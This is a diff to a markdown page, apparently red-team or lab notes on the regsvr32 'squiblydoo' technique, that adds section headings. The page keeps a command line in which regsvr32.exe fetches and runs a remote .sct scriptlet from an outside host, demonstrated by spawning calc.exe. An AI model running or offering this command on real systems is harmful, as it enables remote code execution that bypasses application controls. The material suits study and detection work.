@@ -1,5 +1,7 @@
 # regsvr32 aka squiblydoo
 
+## Code
+
 {% code-tabs %}
 {% code-tabs-item title="back.sct" %}
 ```markup
@@ -19,11 +21,15 @@
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
+## Execution
+
 We can then execute the code from the command prompt:
 
 ```bash
 regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 ```
+
+## Observations
 
 ![calc.exe spawned by regsvr32.exe](../.gitbook/assets/regsvr32.png)
 
